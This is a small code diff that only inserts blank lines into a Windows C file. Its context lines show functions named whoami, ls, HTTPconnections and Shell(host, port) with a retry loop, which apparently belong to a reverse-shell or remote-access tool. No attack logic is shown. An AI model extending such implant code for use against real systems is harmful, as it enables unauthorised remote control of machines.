@@ -30,6 +30,8 @@ void whoami() {
 	printf("%s\\%s", info_System, info_User);
 
 }
+
+
 void ls(char* inputDir) {
 	WIN32_FIND_DATA fileData;	// Stucture for storing all the file info
 	LARGE_INTEGER fileSize;
@@ -59,6 +61,8 @@ void ls(char* inputDir) {
 	} while (FindNextFile(hdata, &fileData) != 0);							// If next file exists then do
 
 }
+
+
 
 int Shell(char* host, int port){
     int tries = 3;
@@ -151,6 +155,8 @@ int Shell(char* host, int port){
 		tries = tries - 1;
     }
 }
+
+
 
 void HTTPconnections() {
 
